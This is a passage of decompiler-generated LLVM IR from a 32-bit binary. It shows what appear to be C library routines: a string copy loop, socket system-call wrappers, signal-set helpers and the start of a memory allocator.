  %v4_805005a = ptrtoint i8* %arg1 to i32
  store i32 %v4_805005a, i32* %edi.global-to-local, align 4
  %v4_805005e.pre = load i32, i32* @eax, align 4
  %v8_805005e.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805005e

dec_label_pc_805005e:                             ; preds = %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge, %dec_label_pc_8050051
  %v2_805005f = phi i32 [ %v7_805005f, %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge ], [ %v4_805005a, %dec_label_pc_8050051 ]
  %v8_805005e = phi i1 [ %v5_805005f, %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge ], [ %v8_805005e.pre, %dec_label_pc_8050051 ]
  %v4_805005e = phi i32 [ %v0_8050060, %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge ], [ %v4_805005e.pre, %dec_label_pc_8050051 ]
  %v7_805005e = phi i32 [ %v0_805005e.pre, %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge ], [ %arg2, %dec_label_pc_8050051 ]
  %v1_805005e = inttoptr i32 %v7_805005e to i8*
  %v2_805005e = load i8, i8* %v1_805005e, align 1
  %v3_805005e = zext i8 %v2_805005e to i32
  %v5_805005e = and i32 %v4_805005e, -256
  %v6_805005e = or i32 %v3_805005e, %v5_805005e
  store i32 %v6_805005e, i32* %eax.global-to-local, align 4
  %v9_805005e = select i1 %v8_805005e, i32 -1, i32 1
  %v10_805005e = add i32 %v7_805005e, %v9_805005e
  store i32 %v10_805005e, i32* %esi.global-to-local, align 4
  %v3_805005f = inttoptr i32 %v2_805005f to i8*
  store i8 %v2_805005e, i8* %v3_805005f, align 1
  %v4_805005f = load i32, i32* %edi.global-to-local, align 4
  %v5_805005f = load i1, i1* @df, align 1
  %v6_805005f = select i1 %v5_805005f, i32 -1, i32 1
  %v7_805005f = add i32 %v6_805005f, %v4_805005f
  store i32 %v7_805005f, i32* %edi.global-to-local, align 4
  %v0_8050060 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050060 = trunc i32 %v0_8050060 to i8
  %v4_8050060 = icmp eq i8 %v3_8050060, 0
  %v1_8050062 = icmp eq i1 %v4_8050060, false
  br i1 %v1_8050062, label %dec_label_pc_805005e.dec_label_pc_805005e_crit_edge, label %dec_label_pc_8050064

dec_label_pc_805005e.dec_label_pc_805005e_crit_edge: ; preds = %dec_label_pc_805005e
  %v0_805005e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805005e

dec_label_pc_8050064:                             ; preds = %dec_label_pc_805005e
  store i32 %v4_805005a, i32* %eax.global-to-local, align 4
  %v2_8050069 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050069, i32* %esi.global-to-local, align 4
  ret i32 %v4_805005a

; uselistorder directives
  uselistorder i32 %v0_8050060, { 1, 0 }
  uselistorder i32 %v7_805005f, { 1, 0 }
  uselistorder i1 %v5_805005f, { 1, 0 }
  uselistorder i32 %v4_805005a, { 1, 2, 0, 3 }
}

define i32 @function_805006c() local_unnamed_addr {
dec_label_pc_805006c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_805006f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8050078 = inttoptr i32 %tmp to i8*
  %v3_8050078 = call i32 @function_8052231(i8* %v2_8050078, i32 %v2_805006f)
  %v1_8050083 = icmp eq i32 %v3_8050078, 0
  br i1 %v1_8050083, label %dec_label_pc_805008b, label %dec_label_pc_8050087

dec_label_pc_8050087:                             ; preds = %dec_label_pc_805006c
  %v3_8050087 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805008b

dec_label_pc_805008b:                             ; preds = %dec_label_pc_805006c, %dec_label_pc_8050087
  %v0_805008b = phi i32 [ -1, %dec_label_pc_805006c ], [ %v3_8050087, %dec_label_pc_8050087 ]
  ret i32 %v0_805008b

; uselistorder directives
  uselistorder label %dec_label_pc_805008b, { 1, 0 }
}

define i32 @function_8050091(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050091:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80500ac = ptrtoint i32* %stack_var_-12 to i32
  %v2_80500b3 = call i32 @function_8051c7b(i32 2, i32 %v2_80500ac)
  ret i32 %v2_80500b3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80500bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80500bc:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80500d7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80500de = call i32 @function_8051c7b(i32 3, i32 %v2_80500d7)
  ret i32 %v2_80500de

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80500e7(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80500e7:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050102 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050109 = call i32 @function_8051c7b(i32 6, i32 %v2_8050102)
  ret i32 %v2_8050109

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050112() local_unnamed_addr {
dec_label_pc_8050112:
  %stack_var_-20 = alloca i32, align 4
  %v2_805013d = ptrtoint i32* %stack_var_-20 to i32
  %v2_8050144 = call i32 @function_8051c7b(i32 15, i32 %v2_805013d)
  ret i32 %v2_8050144
}

define i32 @function_805014d(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805014d:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_8050160 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8050167 = call i32 @function_8051c7b(i32 4, i32 %v2_8050160)
  ret i32 %v2_8050167

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8050170() local_unnamed_addr {
dec_label_pc_8050170:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050193 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805019a = call i32 @function_8051c7b(i32 10, i32 %v2_8050193)
  ret i32 %v2_805019a
}

define i32 @function_80501a3() local_unnamed_addr {
dec_label_pc_80501a3:
  %stack_var_-24 = alloca i32, align 4
  %v2_80501d6 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80501dd = call i32 @function_8051c7b(i32 12, i32 %v2_80501d6)
  ret i32 %v2_80501dd
}

define i32 @function_80501e6() local_unnamed_addr {
dec_label_pc_80501e6:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050209 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050210 = call i32 @function_8051c7b(i32 9, i32 %v2_8050209)
  ret i32 %v2_8050210
}

define i32 @function_8050219() local_unnamed_addr {
dec_label_pc_8050219:
  %stack_var_-24 = alloca i32, align 4
  %v2_805024c = ptrtoint i32* %stack_var_-24 to i32
  %v2_8050253 = call i32 @function_8051c7b(i32 11, i32 %v2_805024c)
  ret i32 %v2_8050253
}

define i32 @function_805025c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805025c:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050287 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805028e = call i32 @function_8051c7b(i32 14, i32 %v2_8050287)
  ret i32 %v2_805028e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8050297(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050297:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80502b2 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80502b9 = call i32 @function_8051c7b(i32 1, i32 %v2_80502b2)
  ret i32 %v2_80502b9

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051c7b, { 5, 10, 4, 6, 3, 2, 9, 1, 7, 0, 8 }
}

define i32 @function_80502c2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80502c2:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80502da, label %dec_label_pc_80502cd

dec_label_pc_80502cd:                             ; preds = %dec_label_pc_80502c2
  %v1_80502cd = add i32 %arg1, -64
  %v3_80502cd = sub i32 63, %arg1
  %v4_80502cd = and i32 %v3_80502cd, %arg1
  %v5_80502cd = icmp slt i32 %v4_80502cd, 0
  %v6_80502cd = icmp eq i32 %v1_80502cd, 0
  %v7_80502cd = icmp slt i32 %v1_80502cd, 0
  %v3_80502d0 = icmp eq i1 %v7_80502cd, %v5_80502cd
  %v4_80502d0 = icmp eq i1 %v6_80502cd, false
  %v5_80502d0 = and i1 %v4_80502d0, %v3_80502d0
  br i1 %v5_80502d0, label %dec_label_pc_80502da, label %dec_label_pc_80502d2

dec_label_pc_80502d2:                             ; preds = %dec_label_pc_80502cd
  %v4_80502d5 = call i32 @function_80503d8(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80502da

dec_label_pc_80502da:                             ; preds = %dec_label_pc_80502cd, %dec_label_pc_80502c2, %dec_label_pc_80502d2
  %v1_80502da = call i32 @function_804ffeb(i32 ptrtoint (i32* @0 to i32))
  %v1_80502df = inttoptr i32 %v1_80502da to i32*
  store i32 22, i32* %v1_80502df, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80502cd, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80502da, { 2, 0, 1 }
}

define i32 @function_80502ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_80502ec:
  %v3_80502fa = inttoptr i32 %arg1 to i8*
  %v4_80502fa = call i32 @function_805003c(i8* %v3_80502fa, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8050305(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050305:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050305 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_805031a = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_805031a
  br i1 %tmp36, label %dec_label_pc_8050328, label %dec_label_pc_8050343.lr.ph

dec_label_pc_8050328:                             ; preds = %dec_label_pc_8050305
  %v1_8050328 = call i32 @function_804ffeb(i32 %v0_8050305)
  store i32 %v1_8050328, i32* %eax.global-to-local, align 4
  %v1_805032d = inttoptr i32 %v1_8050328 to i32*
  store i32 22, i32* %v1_805032d, align 4
  br label %dec_label_pc_80503ac

dec_label_pc_8050343.lr.ph:                       ; preds = %dec_label_pc_8050305
  %v15_8050306 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805034328 = add i32 %v15_8050306, 284
  %v5_805034329 = inttoptr i32 %v4_805034328 to i32*
  store i32 0, i32* %v5_805034329, align 4
  %v0_805034e30 = load i32, i32* %eax.global-to-local, align 4
  %v1_805034e31 = add i32 %v0_805034e30, -1
  %v9_805034e32 = icmp slt i32 %v1_805034e31, 0
  store i32 %v1_805034e31, i32* %eax.global-to-local, align 4
  %v1_805034f33 = icmp eq i1 %v9_805034e32, false
  br i1 %v1_805034f33, label %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge, label %dec_label_pc_8050351

dec_label_pc_8050343.dec_label_pc_8050343_crit_edge: ; preds = %dec_label_pc_8050343.lr.ph, %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge
  %v1_805034e34 = phi i32 [ %v1_805034e, %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge ], [ %v1_805034e31, %dec_label_pc_8050343.lr.ph ]
  %v0_8050343.pre = load i32, i32* @esp, align 4
  %v2_8050343 = mul i32 %v1_805034e34, 4
  %v3_8050343 = add i32 %v0_8050343.pre, 160
  %v4_8050343 = add i32 %v3_8050343, %v2_8050343
  %v5_8050343 = inttoptr i32 %v4_8050343 to i32*
  store i32 0, i32* %v5_8050343, align 4
  %v0_805034e = load i32, i32* %eax.global-to-local, align 4
  %v1_805034e = add i32 %v0_805034e, -1
  %v9_805034e = icmp slt i32 %v1_805034e, 0
  store i32 %v1_805034e, i32* %eax.global-to-local, align 4
  %v1_805034f = icmp eq i1 %v9_805034e, false
  br i1 %v1_805034f, label %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge, label %dec_label_pc_8050351

dec_label_pc_8050351:                             ; preds = %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge, %dec_label_pc_8050343.lr.ph
  %v0_8050351 = load i32, i32* @edx, align 4
  %v2_8050354 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050354, i32* %eax.global-to-local, align 4
  %v4_805035c = call i32 @function_80503d8(i32 %v2_8050354, i32 %arg1, i32 %v0_8050351, i32 %v0_8050351)
  store i32 %v4_805035c, i32* %eax.global-to-local, align 4
  %v2_8050364 = icmp slt i32 %v4_805035c, 0
  br i1 %v2_8050364, label %dec_label_pc_80503ac, label %dec_label_pc_8050368

dec_label_pc_8050368:                             ; preds = %dec_label_pc_8050351
  %v4_8050370 = call i32 @function_80503b4(i32 ptrtoint (i32* @global_var_80532a0.30 to i32), i32 %arg1, i32 %v4_805035c, i32 %v4_805035c)
  %v2_8050389 = ptrtoint i32* %stack_var_-284 to i32
  %v2_805038e = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805038e, i32* %eax.global-to-local, align 4
  %v4_8050397 = call i32 @function_8051b87(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8050389)
  store i32 %v4_8050397, i32* %eax.global-to-local, align 4
  %v2_805039f = icmp slt i32 %v4_8050397, 0
  %v3_80503a3 = load i32, i32* %stack_var_-284, align 4
  %.v3_80503a3 = select i1 %v2_805039f, i32 -1, i32 %v3_80503a3
  br label %dec_label_pc_80503ac

dec_label_pc_80503ac:                             ; preds = %dec_label_pc_8050368, %dec_label_pc_8050328, %dec_label_pc_8050351
  %storemerge = phi i32 [ -1, %dec_label_pc_8050351 ], [ -1, %dec_label_pc_8050328 ], [ %.v3_80503a3, %dec_label_pc_8050368 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805034e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 10, 11, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 8, 1, 2, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80503ac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050343.dec_label_pc_8050343_crit_edge, { 1, 0 }
}

define i32 @function_80503b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80503b4:
  %v1_80503c2 = add i32 %arg2, -1
  %v1_80503c5 = urem i32 %v1_80503c2, 32
  %v2_80503c5 = icmp eq i32 %v1_80503c5, 0
  %v2_80503c8 = udiv i32 %v1_80503c2, 32
  br i1 %v2_80503c5, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80503b4
  %v5_80503cb = shl i32 1, %v1_80503c5
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80503b4, %bb
  %v6_80503cd = phi i32 [ 1, %dec_label_pc_80503b4 ], [ %v5_80503cb, %bb ]
  %v2_80503cd = mul nuw nsw i32 %v2_80503c8, 4
  %v3_80503cd = add i32 %v2_80503cd, %arg1
  %v4_80503cd = inttoptr i32 %v3_80503cd to i32*
  %v5_80503cd = load i32, i32* %v4_80503cd, align 4
  %v7_80503cd = and i32 %v5_80503cd, %v6_80503cd
  %v8_80503cd = icmp eq i32 %v7_80503cd, 0
  %v1_80503d1 = icmp eq i1 %v8_80503cd, false
  %v2_80503d1 = zext i1 %v1_80503d1 to i32
  ret i32 %v2_80503d1

; uselistorder directives
  uselistorder i32 %v1_80503c5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80503d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80503d8:
  %stack_var_-4 = alloca i32, align 4
  %v0_80503d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80503d8, i32* %stack_var_-4, align 4
  %v1_80503e6 = add i32 %arg2, -1
  %v1_80503e9 = urem i32 %v1_80503e6, 32
  %v2_80503e9 = icmp eq i32 %v1_80503e9, 0
  store i32 %v1_80503e9, i32* @ecx, align 4
  %v2_80503ec = udiv i32 %v1_80503e6, 32
  store i32 %v2_80503ec, i32* @edx, align 4
  br i1 %v2_80503e9, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80503d8
  %v5_80503ef = shl i32 1, %v1_80503e9
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80503d8, %bb
  %v6_80503f1 = phi i32 [ 1, %dec_label_pc_80503d8 ], [ %v5_80503ef, %bb ]
  %v2_80503f1 = mul nuw nsw i32 %v2_80503ec, 4
  %v3_80503f1 = add i32 %v2_80503f1, %arg1
  %v4_80503f1 = inttoptr i32 %v3_80503f1 to i32*
  %v5_80503f1 = load i32, i32* %v4_80503f1, align 4
  %v7_80503f1 = or i32 %v5_80503f1, %v6_80503f1
  store i32 %v7_80503f1, i32* %v4_80503f1, align 4
  %v2_80503f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80503f6, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80503ec, { 1, 0 }
  uselistorder i32 %v1_80503e9, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80503f8() local_unnamed_addr {
dec_label_pc_80503f8:
  %v0_80503f8 = load i32, i32* @eax, align 4
  %v6_805040b = icmp ugt i32 %v0_80503f8, 16777215
  br i1 %v6_805040b, label %dec_label_pc_805041c, label %dec_label_pc_805040d

dec_label_pc_805040d:                             ; preds = %dec_label_pc_80503f8
  %v2_80503fb = udiv i32 %v0_80503f8, 256
  %tmp = icmp ult i32 %v0_80503f8, 256
  %v2_805040d = call i32 @llvm.ctlz.i32(i32 %v2_80503fb, i1 true)
  %v3_805040d = xor i32 %v2_805040d, 31
  %v5_805040d = select i1 %tmp, i32 95, i32 %v3_805040d
  %v1_8050410 = add nuw nsw i32 %v5_805040d, 6
  %v2_8050413 = urem i32 %v1_8050410, 32
  %v4_8050413 = icmp eq i32 %v2_8050413, 0
  br i1 %v4_8050413, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805040d
  %v5_8050413 = lshr i32 %v0_80503f8, %v2_8050413
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805040d, %bb
  %v0_8050415 = phi i32 [ %v0_80503f8, %dec_label_pc_805040d ], [ %v5_8050413, %bb ]
  %v1_8050415 = urem i32 %v0_8050415, 4
  %v2_8050418 = mul nuw nsw i32 %v5_805040d, 4
  %v3_8050418 = or i32 %v1_8050415, 32
  %v4_8050418 = add nuw nsw i32 %v3_8050418, %v2_8050418
  br label %dec_label_pc_805041c

dec_label_pc_805041c:                             ; preds = %dec_label_pc_80503f8, %bb4
  %v0_805041d = phi i32 [ 95, %dec_label_pc_80503f8 ], [ %v4_8050418, %bb4 ]
  ret i32 %v0_805041d

; uselistorder directives
  uselistorder i32 %v2_8050413, { 1, 0 }
  uselistorder i32 %v0_80503f8, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_805041c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_805041e(i32 %arg1) local_unnamed_addr {
dec_label_pc_805041e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805041e = load i32, i32* @ebp, align 4
  %v0_805041f = load i32, i32* @edi, align 4
  %v0_8050420 = load i32, i32* @esi, align 4
  %v0_8050421 = load i32, i32* @ebx, align 4
  store i32 %v0_8050421, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050433 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050433, i32* @eax, align 4
  store i32 %v2_8050433, i32* %stack_var_-92, align 4
  %v2_8050438 = call i32 @function_805194a(i32 %v2_8050433, i32 134551879)
  store i32 %v2_8050438, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.31 to i32), i32* %stack_var_-92, align 4
  %v1_8050444 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  store i32 %v1_8050444, i32* %eax.global-to-local, align 4
  %v0_805044c = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_805044c, -32
  br i1 %tmp123, label %dec_label_pc_8050463, label %dec_label_pc_8050451

dec_label_pc_8050451:                             ; preds = %dec_label_pc_805041e
  %v0_8050451 = load i32, i32* %stack_var_-92, align 4
  %v1_8050451 = call i32 @function_804ffeb(i32 %v0_8050451)
  store i32 %v1_8050451, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050458 = inttoptr i32 %v1_8050451 to i32*
  store i32 12, i32* %v1_8050458, align 4
  br label %dec_label_pc_8050b88

dec_label_pc_8050463:                             ; preds = %dec_label_pc_805041e
  %v1_8050463 = add i32 %v0_805044c, 11
  %tmp124 = icmp ult i32 %v1_8050463, 16
  %v1_8050473 = and i32 %v1_8050463, -8
  %v1_8050463.v1_8050473 = select i1 %tmp124, i32 %v1_8050463, i32 %v1_8050473
  %.v1_8050473 = select i1 %tmp124, i32 16, i32 %v1_8050473
  store i32 %v1_8050463.v1_8050473, i32* %eax.global-to-local, align 4
  %v0_805047a = load i8, i8* @global_var_8053320.32, align 1
  %v1_805047a = sext i8 %v0_805047a to i32
  store i32 %v1_805047a, i32* @ebx, align 4
  %v3_8050480 = urem i8 %v0_805047a, 2
  %v4_8050480 = icmp eq i8 %v3_8050480, 0
  %v1_8050483 = icmp eq i1 %v4_8050480, false
  br i1 %v1_8050483, label %dec_label_pc_80504a2, label %dec_label_pc_8050485

dec_label_pc_8050485:                             ; preds = %dec_label_pc_8050463
  %v2_8050485 = icmp eq i8 %v0_805047a, 0
  %v1_8050487 = icmp eq i1 %v2_8050485, false
  br i1 %v1_8050487, label %dec_label_pc_805077d, label %dec_label_pc_805048d

dec_label_pc_805048d:                             ; preds = %dec_label_pc_8050485
  store i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32* %stack_var_-92, align 4
  %v2_8050495 = call i32 @function_805103b(i32* bitcast (i8* @global_var_8053320.32 to i32*))
  store i32 %v2_8050495, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805077d

dec_label_pc_80504a2:                             ; preds = %dec_label_pc_8050463
  %v11_80504a2 = trunc i32 %.v1_8050473 to i8
  %v8_80504a6 = icmp ugt i8 %v11_80504a2, %v0_805047a
  br i1 %v8_80504a6, label %dec_label_pc_80504c3, label %dec_label_pc_80504a8

dec_label_pc_80504a8:                             ; preds = %dec_label_pc_80504a2
  %v2_80504ac = udiv i32 %.v1_8050473, 2
  store i32 %v2_80504ac, i32* %eax.global-to-local, align 4
  %v1_80504ae = add i32 %v2_80504ac, ptrtoint (i8* @global_var_8053320.32 to i32)
  store i32 %v1_80504ae, i32* %ecx.global-to-local, align 4
  %v1_80504b4 = add i32 %v2_80504ac, add (i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32 -4)
  %v2_80504b4 = inttoptr i32 %v1_80504b4 to i32*
  %v3_80504b4 = load i32, i32* %v2_80504b4, align 4
  store i32 %v3_80504b4, i32* @edx, align 4
  %v1_80504b7 = icmp eq i32 %v3_80504b4, 0
  br i1 %v1_80504b7, label %dec_label_pc_80504c3, label %dec_label_pc_80504bb

dec_label_pc_80504bb:                             ; preds = %dec_label_pc_80504a8
  %v1_80504bb = add i32 %v3_80504b4, 8
  %v2_80504bb = inttoptr i32 %v1_80504bb to i32*
  %v3_80504bb = load i32, i32* %v2_80504bb, align 4
  store i32 %v3_80504bb, i32* %eax.global-to-local, align 4
  store i32 %v3_80504bb, i32* %v2_80504b4, align 4
  br label %dec_label_pc_80504fc

dec_label_pc_80504c3:                             ; preds = %dec_label_pc_80504a8, %dec_label_pc_80504a2
  %v8_80504c3 = icmp ult i32 %.v1_8050473, 255
  %v6_80504cb = icmp ugt i32 %.v1_8050473, 255
  store i32 %.v1_8050473, i32* @eax, align 4
  br i1 %v6_80504cb, label %dec_label_pc_8050504, label %dec_label_pc_80504cd

dec_label_pc_80504cd:                             ; preds = %dec_label_pc_80504c3
  %v2_80504d1 = udiv i32 %.v1_8050473, 8
  store i32 %v2_80504d1, i32* %eax.global-to-local, align 4
  %v1_80504d8 = mul nuw i32 %v2_80504d1, 8
  %v2_80504d8 = add i32 %v1_80504d8, ptrtoint (i32* @global_var_805334c.33 to i32)
  store i32 %v2_80504d8, i32* %ecx.global-to-local, align 4
  %v1_80504df = add i32 %v1_80504d8, add (i32 ptrtoint (i32* @global_var_805334c.33 to i32), i32 12)
  %v2_80504df = inttoptr i32 %v1_80504df to i32*
  %v3_80504df = load i32, i32* %v2_80504df, align 4
  store i32 %v3_80504df, i32* @edx, align 4
  %v12_80504e2 = icmp eq i32 %v3_80504df, %v2_80504d8
  br i1 %v12_80504e2, label %dec_label_pc_8050600.preheader, label %dec_label_pc_80504ea

dec_label_pc_80504ea:                             ; preds = %dec_label_pc_80504cd
  store i32 %.v1_8050473, i32* %ebx.global-to-local, align 4
  %v1_80504ee = add i32 %v3_80504df, 12
  %v2_80504ee = inttoptr i32 %v1_80504ee to i32*
  %v3_80504ee = load i32, i32* %v2_80504ee, align 4
  store i32 %v3_80504ee, i32* %eax.global-to-local, align 4
  store i32 %v3_80504ee, i32* %v2_80504df, align 4
  %v0_80504f4 = load i32, i32* @edx, align 4
  %v1_80504f4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80504f4 = add i32 %v0_80504f4, 4
  %v3_80504f4 = add i32 %v2_80504f4, %v1_80504f4
  %v4_80504f4 = inttoptr i32 %v3_80504f4 to i32*
  %v5_80504f4 = load i32, i32* %v4_80504f4, align 4
  %v6_80504f4 = or i32 %v5_80504f4, 1
  store i32 %v6_80504f4, i32* %v4_80504f4, align 4
  %v0_80504f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80504f9 = add i32 %v1_80504f9, 8
  %v3_80504f9 = inttoptr i32 %v2_80504f9 to i32*
  store i32 %v0_80504f9, i32* %v3_80504f9, align 4
  br label %dec_label_pc_80504fc

dec_label_pc_80504fc:                             ; preds = %dec_label_pc_8050899, %dec_label_pc_80508ab, %dec_label_pc_80504bb, %dec_label_pc_80504ea
  %v0_80504fc = load i32, i32* @edx, align 4
  %v1_80504fc = add i32 %v0_80504fc, 8
  store i32 %v1_80504fc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_8050504:                             ; preds = %dec_label_pc_80504c3
  %v0_8050508 = call i32 @function_80503f8()
  store i32 %v0_8050508, i32* %eax.global-to-local, align 4
  %v3_805050d = and i8 %v0_805047a, 2
  %v4_805050d = icmp eq i8 %v3_805050d, 0
  %v6_805050d = zext i8 %v3_805050d to i32
  %v9_805050d = and i32 %v1_805047a, -256
  %v10_805050d = or i32 %v9_805050d, %v6_805050d
  store i32 %v10_805050d, i32* @ebx, align 4
  br i1 %v4_805050d, label %dec_label_pc_8050600.preheader, label %dec_label_pc_805051a

dec_label_pc_805051a:                             ; preds = %dec_label_pc_8050504
  store i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32* %stack_var_-92, align 4
  %v2_8050522 = call i32 @function_805103b(i32* bitcast (i8* @global_var_8053320.32 to i32*))
  store i32 %v2_8050522, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050600.preheader

dec_label_pc_8050600.preheader:                   ; preds = %dec_label_pc_805051a, %dec_label_pc_80504cd, %dec_label_pc_8050504
  %stack_var_-40.0.ph = phi i32 [ %v2_80504d1, %dec_label_pc_80504cd ], [ %v0_8050508, %dec_label_pc_805051a ], [ %v0_8050508, %dec_label_pc_8050504 ]
  %v0_80506009 = load i32, i32* @global_var_8053360.36, align 32
  store i32 %v0_80506009, i32* @ebp, align 4
  %v9_805060615 = icmp eq i32 %v0_80506009, 134558548
  %v1_805060c17 = icmp eq i1 %v9_805060615, false
  br i1 %v1_805060c17, label %dec_label_pc_805052f.lr.ph, label %dec_label_pc_8050612

